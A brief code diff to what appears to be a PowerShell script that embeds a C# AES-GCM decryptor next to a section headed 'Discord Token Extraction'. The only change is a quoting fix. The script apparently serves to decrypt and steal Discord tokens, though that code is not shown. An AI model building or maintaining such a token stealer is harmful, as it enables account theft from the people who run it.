@@ -1,5 +1,5 @@
 #region C# Code for AES-GCM Decryption
-Add-Type -TypeDefinition @"
+Add-Type -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -116,7 +116,7 @@ public class AesGcmDecryptor
         }
     }
 }
-"@ -ReferencedAssemblies System.Security
+'@ -ReferencedAssemblies System.Security
 #endregion
 
 #region Discord Token Extraction
